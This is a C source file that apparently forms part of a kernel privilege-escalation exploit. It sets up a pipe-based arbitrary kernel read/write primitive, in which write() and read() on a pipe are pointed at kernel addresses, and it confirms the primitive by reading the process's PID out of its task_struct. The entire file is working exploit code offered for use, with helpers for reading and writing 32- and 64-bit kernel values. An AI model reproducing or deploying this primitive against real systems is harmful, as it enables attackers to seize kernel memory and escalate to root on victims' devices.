#include <errno.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#include "../include/kernel_rw.h"
#include "../include/log.h"

void init_kernel_read_write_pipe(int pipefd[2]) {
  if (pipe(pipefd) == -1) {
    ERROR("pipe creation failed: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }
  SUCCESS("Kernel R/W pipe created (r=%d, w=%d)", pipefd[0], pipefd[1]);
}

void verify_arbitrary_read_write(int pipefd[2], struct task_struct *task_struct,
                                 void *pid_address) {
  pid_t real_pid = getpid();
  pid_t kernel_pid = kernel_read_dword(pid_address, pipefd);
  INFO("real pid = %d, kernel pid = %d", real_pid, kernel_pid);
  if (real_pid != kernel_pid) {
    ERROR("Arbitrary read/write verification failed");
    exit(EXIT_FAILURE);
  }
  SUCCESS("Arbitrary read/write works");
}

bool kernel_read(void *addr, size_t len, void *ubuf, int pipefd[2]) {
  // INFO("Performing kernel read");

  ssize_t written = write(pipefd[1], addr, len);

  if (written != len) {
    ERROR("Failed to write data from kernel: %p (%s)", addr, strerror(errno));
    return false;
  }

  ssize_t read_bytes = read(pipefd[0], ubuf, len);

  if (read_bytes != len) {
    ERROR("Failed to read data from kernel: %p (%s)", addr, strerror(errno));
    return false;
  }

  // SUCCESS("Kernel data read");

  return true;
}

bool kernel_write(void *addr, size_t len, void *ubuf, int pipefd[2]) {
  // INFO("Performing Kernel write");

  ssize_t written = write(pipefd[1], ubuf, len);

  if (written != len) {
    ERROR("Failed to write data from user space: %p (%s)", addr,
          strerror(errno));
    return false;
  }

  ssize_t read_bytes = read(pipefd[0], addr, len);

  if (read_bytes != len) {
    ERROR("Failed to write data to kernel: %p (%s)", addr, strerror(errno));
    return false;
  }

  // SUCCESS("Kernel data write");

  return true;
}

uint32_t kernel_read_dword(void *addr, int pipefd[2]) {
  uint32_t buffer = 0;
  if (!kernel_read(addr, sizeof(buffer), &buffer, pipefd)) {
    exit(EXIT_FAILURE);
  }
  return buffer;
}

uint64_t kernel_read_qword(void *addr, int pipefd[2]) {
  uint64_t buffer = 0;
  if (!kernel_read(addr, sizeof(buffer), &buffer, pipefd)) {
    exit(EXIT_FAILURE);
  }
  return buffer;
}

bool kernel_write_dword(void *addr, uint32_t value, int pipefd[2]) {
  return kernel_write(addr, sizeof(value), &value, pipefd);
}

bool kernel_write_qword(void *addr, uint64_t value, int pipefd[2]) {
  return kernel_write(addr, sizeof(value), &value, pipefd);
}